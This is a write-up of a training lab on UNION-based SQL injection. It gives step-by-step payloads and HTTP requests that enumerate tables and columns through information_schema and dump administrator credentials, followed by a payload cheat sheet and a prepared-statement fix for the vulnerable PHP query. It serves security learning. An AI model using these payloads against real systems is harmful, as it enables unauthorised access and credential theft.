# 🧪 Lab: SQL Injection Attack – Listing Database Contents (Non-Oracle)

## 🎯 Goal

* Find **users table**
* Extract **username & password columns**
* Dump credentials
* Login as **administrator**

---

## 🧠 Concept

**UNION-based SQL Injection**

* Combines original query + attacker query
* Conditions:

  * Same number of columns
  * Compatible data types

---

## 🔍 Exploitation Steps

### 1️⃣ Find Number of Columns

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

✔️ Stop when error appears (e.g., 2 columns)

---

### 2️⃣ Find Reflected Columns

```sql
' UNION SELECT 'test','test'--
```

✔️ Identify which column is visible

---

### 3️⃣ Extract Table Names

```http
GET /filter?category=' UNION SELECT table_name, NULL FROM information_schema.tables--
```

✔️ Example output:

```
users_jqfcel
```

---

### 4️⃣ Extract Column Names

```http
GET /filter?category=' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_jqfcel'--
```

✔️ Example output:

```
username_wkuozy
password_miwszg
```

---

### 5️⃣ Dump Credentials

```http
GET /filter?category=' UNION SELECT username_wkuozy, password_miwszg FROM users_jqfcel--
```

✔️ Example output:

```
administrator : <password>
```

---

### 6️⃣ Login as Admin

* Use extracted credentials
* ✅ Lab solved

---

## ⚡ Key Learnings

### 🔑 information_schema

* `tables` → all tables
* `columns` → all columns

---

### 🔑 NULL Trick

```sql
UNION SELECT table_name, NULL
```

---

### 🔑 Works On

* MySQL
* PostgreSQL
* SQL Server

---

## 🛡️ Prevention

### ❌ Vulnerable Code

```php
$query = "SELECT * FROM products WHERE category = '$input'";
```

### ✅ Secure Code

```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category = ?");
$stmt->execute([$input]);
```

---

## 🧠 Payload Cheat Sheet

```sql
-- Tables
' UNION SELECT table_name, NULL FROM information_schema.tables--

-- Columns
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xxx'--

-- Data dump
' UNION SELECT username, password FROM users_xxx--
```

---

## 🔥 Interview Line

"Used UNION-based SQLi with information_schema to enumerate DB and extract admin credentials."
